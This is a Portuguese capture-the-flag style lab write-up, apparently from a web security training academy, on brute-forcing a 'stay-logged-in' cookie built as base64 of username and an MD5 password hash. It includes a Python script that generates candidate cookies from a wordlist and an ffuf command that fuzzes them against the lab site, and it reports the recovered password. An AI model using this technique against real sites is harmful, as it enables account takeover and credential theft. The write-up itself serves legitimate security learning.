## Objetivo
Fazer o brute-force em um cookie stay-logged-in 

## Vulnerabilidade Identificada
O cookie é uma codificação basica de base64 com username:MD5 e não apresenta nenhuma proteção contra brute-force. 
o MD5 é fraco criptograficamente, o MD5 é um algoritmo de hash quebrado e facilmente reversível via wordlist ou rainbow tables

## Comandos Utilizados

Primeiro criei um script python que fizesse a logica do cookie stay-logged-in com todas as senhas da wordlist
```python
import hashlib
import base64
            
with open('/home/luweed/Documents/rockpass.txt') as f:
    senhas = f.read().splitlines()
    
with open('/home/luweed/Documents/cookiebase64md5.txt', 'w') as f:
    for senha in senhas:
        md5 = hashlib.md5(senha.encode()).hexdigest()
        cookie = base64.b64encode(f"carlos:{md5}".encode()).decode()
        f.write(cookie + '\n')
```

Depois rodei o brute-force no cookie stay-logged-in com ffuf e filtrei a substring "Update email" que tem quando está na conta logada que descobri com o wiener:peter
```bash
ffuf -w /home/luweed/Documents/cookiebase64md5.txt:FUZZ \
     -u https://0a1600940350f3b18099da2200490021.web-security-academy.net/my-account?id=carlos \
     -H "Cookie: stay-logged-in=FUZZ" \
     -mr "Update email" 
```
o output vai ser o cookie stay-logged-in de carlos, assim é só ir na lista q cookiebase64md5.txt e ctrl + f procura por ele. pega a colocação em numero. 
Após isso só olhar qual senha está na mesma posição em rockpass.txt e ali estará a senha do carlos


## Resultado
Nesse lab especifico foi 
<img width="1008" height="258" alt="image" src="https://github.com/user-attachments/assets/195efeff-2259-4c83-aeb7-f965b3785f38" />
<img width="621" height="91" alt="image" src="https://github.com/user-attachments/assets/a98aacb8-19fb-42d8-9de8-aa79716d91f1" />
<img width="621" height="91" alt="image" src="https://github.com/user-attachments/assets/bf625f3c-b19d-4afa-b16e-69ebe0be0374" />

carlos:master

## Lições Aprendidas
Alguns sistemas deixam as credenciais escondidas em cookies é bom verificar. 
tentar decodificar a logica do cookie de autenticação pode dizer muito sobre como o sistema autentica e abrir vetores de ataque via brute-force ou cracking offline
